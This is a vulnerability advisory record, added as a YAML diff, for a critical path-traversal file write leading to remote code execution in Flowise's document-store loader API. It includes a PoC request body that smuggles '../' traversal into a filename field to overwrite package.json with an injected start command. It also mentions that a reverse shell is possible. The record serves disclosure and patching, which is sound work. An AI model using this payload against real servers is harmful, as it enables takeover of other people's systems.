@@ -1,0 +1,235 @@
+advisory_id: GHSA-8vvx-qvq9-5948
+datasource_id: github_osv/GHSA-8vvx-qvq9-5948
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-8vvx-qvq9-5948/GHSA-8vvx-qvq9-5948.json
+aliases: []
+summary: |
+  Flowise allows arbitrary file write to RCE
+  ### Summary
+  An attacker could write files with arbitrary content to the filesystem via the `/api/v1/document-store/loader/process` API.
+  An attacker can reach RCE(Remote Code Execution) via file writing.
+
+  ### Details
+  All file writing functions in [packages/components/src/storageUtils.ts](https://github.com/FlowiseAI/Flowise/blob/main/packages/components/src/storageUtils.ts) are vulnerable.
+  - addBase64FilesToStorage
+  - addArrayFilesToStorage
+  - addSingleFileToStorage
+
+  The fileName parameter, which is an untrusted external input, is being used as an argument to path.join() without verification.
+  ```javascript
+  const filePath = path.join(dir, fileName)
+  fs.writeFileSync(filePath, bf)
+  ```
+  Therefore, users can move to the parent folder via `../` and write files to any path.
+
+  Once file writing is possible in all paths, an attacker can reach RCE (Remote Code Execution) in a variety of ways.
+
+  In PoC (Proof of Concept), RCE was reached by overwriting package.json.
+
+  ### PoC
+  In PoC, `package.json` is overwritten.
+  This is a scenario in which arbitrary code is executed when `pnpm start` is executed by changing the start command in the `scripts{}` statement to an arbitrary value.
+
+  **- original start command**
+  ````
+  "start": "run-script-os",
+  ````
+
+  **- modify start command**
+  ````
+  "start": "touch /tmp/pyozzi-poc && run-script-os",
+  ````
+
+  When a user runs the `pnpm start` command, a `pyozzi-poc` file is created in the `/tmp` path.
+
+  #### 1. package.json content base64 encoding
+  ```json
+  {
+      "name": "flowise",
+      "version": "1.8.2",
+      "private": true,
+      "homepage": "https://flowiseai.com",
+      "workspaces": [
+          "packages/*",
+          "flowise",
+          "ui",
+          "components"
+      ],
+      "scripts": {
+          "build": "turbo run build && echo poc",
+          "build-force": "pnpm clean && turbo run build --force",
+          "dev": "turbo run dev --parallel",
+          "start": "touch /tmp/pyozzi-poc && run-script-os", --> modify (add touch /tmp/pyozzi &&)
+          "start:windows": "cd packages/server/bin && run start",
+          "start:default": "cd packages/server/bin && ./run start",
+          "clean": "pnpm --filter \"./packages/**\" clean",
+          "nuke": "pnpm --filter \"./packages/**\" nuke && rimraf node_modules .turbo",
+          "format": "prettier --write \"**/*.{ts,tsx,md}\"",
+          "lint": "eslint \"**/*.{js,jsx,ts,tsx,json,md}\"",
+          "lint-fix": "pnpm lint --fix",
+          "quick": "pretty-quick --staged",
+          "postinstall": "husky install",
+          "migration:create": "pnpm typeorm migration:create"
+      }, ... skip
+  ```
+
+  #### 2. Overwrite `package.json` via `/api/v1/document-store/loader/process`
+  <img width="1329" alt="image" src="https://github.com/FlowiseAI/Flowise/assets/86613161/a548732d-4bee-4cd0-8565-54fb8e560500">
+
+  > **Request Body**
+  ```json
+  {
+      "loaderId": "textFile",
+      "storeId": "c4b8a8fb-9eb6-47ae-9caa-7702ef8baabb",
+      "loaderName": "Text File",
+      "loaderConfig": {
+          "txtFile": "data:text/plain;BASE64_ENCODEING_CONTENT,filename:/../../../../../usr/src/package.json",
+          "textSplitter": "",
+          "metadata": "",
+          "omitMetadataKeys": ""
+      }
+  }
+  ```
+  The part after `filename:` of the `txtFile` parameter is the value used as `fileName` in the function.
+  Add `../` to the filename value to move to the top path, then specify `package.json` in the project folder `/usr/src/` as the path.
+
+  <img width="663" alt="image" src="https://github.com/FlowiseAI/Flowise/assets/86613161/13fdc756-f4d3-45f9-9929-fd978f532a02">
+
+  Afterwards, when the user starts the server (`pnpm start`), the added script will be executed. (`touch /tmp/pyozzi-poc`)
+
+  **- starting server with `touch /tmp/pyozzi-poc` command**
+  <img width="737" alt="image" src="https://github.com/FlowiseAI/Flowise/assets/86613161/341be379-43ca-4acc-9126-dc398475fcf3">
+
+  **- `/tmp/pyozzi-poc` file created**
+  <img width="751" alt="image" src="https://github.com/FlowiseAI/Flowise/assets/86613161/15707068-c000-4d59-972d-89d969c27087">
+
+
+  ### Impact
+  **Remote Code Execution (RCE)**
+  Although it is demonstrated here using the file creation command, you can obtain full server shell privileges by opening a reverse shell.
+impacted_packages:
+  - purl: pkg:npm/flowise
+    affected_versions: vers:npm/<=2.2.7
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/flowise@1.0.0
+      - pkg:npm/flowise@1.0.1
+      - pkg:npm/flowise@1.1.0
+      - pkg:npm/flowise@1.1.1
+      - pkg:npm/flowise@1.2.1
+      - pkg:npm/flowise@1.2.2
+      - pkg:npm/flowise@1.2.3
+      - pkg:npm/flowise@1.2.4
+      - pkg:npm/flowise@1.2.5
+      - pkg:npm/flowise@1.2.6
+      - pkg:npm/flowise@1.2.7
+      - pkg:npm/flowise@1.2.8
+      - pkg:npm/flowise@1.2.9
+      - pkg:npm/flowise@1.2.10
+      - pkg:npm/flowise@1.2.11
+      - pkg:npm/flowise@1.2.12
+      - pkg:npm/flowise@1.2.13
+      - pkg:npm/flowise@1.2.14
+      - pkg:npm/flowise@1.2.15
+      - pkg:npm/flowise@1.2.16
+      - pkg:npm/flowise@1.3.0
+      - pkg:npm/flowise@1.3.1
+      - pkg:npm/flowise@1.3.2
+      - pkg:npm/flowise@1.3.3
+      - pkg:npm/flowise@1.3.4
+      - pkg:npm/flowise@1.3.5
+      - pkg:npm/flowise@1.3.6
+      - pkg:npm/flowise@1.3.7
+      - pkg:npm/flowise@1.3.8-rc.1
+      - pkg:npm/flowise@1.3.8
+      - pkg:npm/flowise@1.3.9
+      - pkg:npm/flowise@1.4.0-rc.1
+      - pkg:npm/flowise@1.4.0
+      - pkg:npm/flowise@1.4.1
+      - pkg:npm/flowise@1.4.2
+      - pkg:npm/flowise@1.4.3
+      - pkg:npm/flowise@1.4.4
+      - pkg:npm/flowise@1.4.5
+      - pkg:npm/flowise@1.4.6
+      - pkg:npm/flowise@1.4.7
+      - pkg:npm/flowise@1.4.8
+      - pkg:npm/flowise@1.4.9
+      - pkg:npm/flowise@1.4.10
+      - pkg:npm/flowise@1.4.11
+      - pkg:npm/flowise@1.4.12
+      - pkg:npm/flowise@1.5.0
+      - pkg:npm/flowise@1.5.1
+      - pkg:npm/flowise@1.6.0
+      - pkg:npm/flowise@1.6.1
+      - pkg:npm/flowise@1.6.2
+      - pkg:npm/flowise@1.6.3
+      - pkg:npm/flowise@1.6.4
+      - pkg:npm/flowise@1.6.5
+      - pkg:npm/flowise@1.6.6
+      - pkg:npm/flowise@1.7.1
+      - pkg:npm/flowise@1.7.2
+      - pkg:npm/flowise@1.8.0
+      - pkg:npm/flowise@1.8.1
+      - pkg:npm/flowise@1.8.2
+      - pkg:npm/flowise@1.8.3
+      - pkg:npm/flowise@1.8.4
+      - pkg:npm/flowise@2.0.0
+      - pkg:npm/flowise@2.0.1
+      - pkg:npm/flowise@2.0.2
+      - pkg:npm/flowise@2.0.3
+      - pkg:npm/flowise@2.0.4
+      - pkg:npm/flowise@2.0.5
+      - pkg:npm/flowise@2.0.6
+      - pkg:npm/flowise@2.0.7
+      - pkg:npm/flowise@2.1.0
+      - pkg:npm/flowise@2.1.1
+      - pkg:npm/flowise@2.1.2
+      - pkg:npm/flowise@2.1.3
+      - pkg:npm/flowise@2.1.4
+      - pkg:npm/flowise@2.1.5
+      - pkg:npm/flowise@2.2.0
+      - pkg:npm/flowise@2.2.1
+      - pkg:npm/flowise@2.2.2
+      - pkg:npm/flowise@2.2.3
+      - pkg:npm/flowise@2.2.4
+      - pkg:npm/flowise@2.2.5
+      - pkg:npm/flowise@2.2.6-hotfix.1
+      - pkg:npm/flowise@2.2.6
+      - pkg:npm/flowise@2.2.7-patch.1
+      - pkg:npm/flowise@2.2.7
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/flowiseai/flowise
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/flowiseai/flowise
+        commit: c2b830f279e454e8b758da441016b2234f220ac7
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '10.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/03/GHSA-8vvx-qvq9-5948/GHSA-8vvx-qvq9-5948.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/FlowiseAI/Flowise
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/commit/c2b830f279e454e8b758da441016b2234f220ac7
+    reference_type:
+    reference_id:
+  - url: https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-8vvx-qvq9-5948
+    reference_type:
+    reference_id: GHSA-8vvx-qvq9-5948
+exploits: []
